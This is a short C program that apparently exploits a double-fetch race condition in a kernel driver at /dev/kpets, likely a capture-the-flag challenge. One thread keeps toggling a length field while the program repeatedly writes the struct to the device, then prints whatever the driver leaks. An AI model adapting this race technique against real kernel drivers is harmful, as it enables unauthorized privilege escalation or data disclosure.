#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

struct item
{
  char type;
  int namelen;
  char char8[32];
  int desclen;
  char char2C[64];
  char target[1];
};

struct item *pet;

int trial(void *arg) {
while(1) {
pet->namelen ^= 0x20+0x40+4+1;
//pet->namelen=0xaa;
}
}

int main() {
pet = (char *)mmap(NULL, 0x2000, 3, 34, -1, 0) + 0xffc;
pet->type = 0xc2;
pet->namelen = 0;
pet->desclen = 0;
pet->target[0]=0xaa;
pthread_t thread;
pthread_attr_t attr;

pthread_attr_init(&attr);
struct sched_param param;
pthread_attr_getschedparam(&attr, &param);
param.sched_priority=SCHED_RR;
pthread_attr_setschedparam(&attr, &param);

pthread_create(&thread, &attr, trial, NULL);
if(sizeof(struct item) != 0x6c + 4) {
return 1;
}

int fd = open("/dev/kpets", 2);
char buf[0x100]={0,};
write(fd, pet, 0x6c);
while(1){
write(fd,pet,0x6c);
if(read(fd,buf,0x100)>=1){
close(fd);
write(1,buf,strlen(buf));
write(1,"\n",1);
break;
}
}
}
